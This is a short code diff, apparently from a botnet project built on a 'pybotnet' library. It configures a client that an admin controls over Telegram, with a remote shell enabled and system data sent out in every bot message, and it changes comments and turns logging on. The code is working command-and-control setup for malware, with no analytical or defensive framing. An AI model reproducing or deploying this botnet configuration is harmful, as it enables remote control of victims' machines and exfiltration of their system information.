@@ -52,12 +52,12 @@ ADMIN_CHAT_ID = '12345678910'
 
 
 
-# * if you compile code without shell: is_sheel=False
-# * show_log: just for debugging
-# * send_system_data: send system short info in bot messages
+# * is_sheel:          if you compile code without shell: is_sheel=False
+# * show_log:          just for debugging
+# * send_system_data:  send system short info in every bot messages in telegram
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
-                        show_log=False, send_system_data=True, is_shell=True)
+                        show_log=True, send_system_data=True, is_shell=True)
 
 delay = 10
 
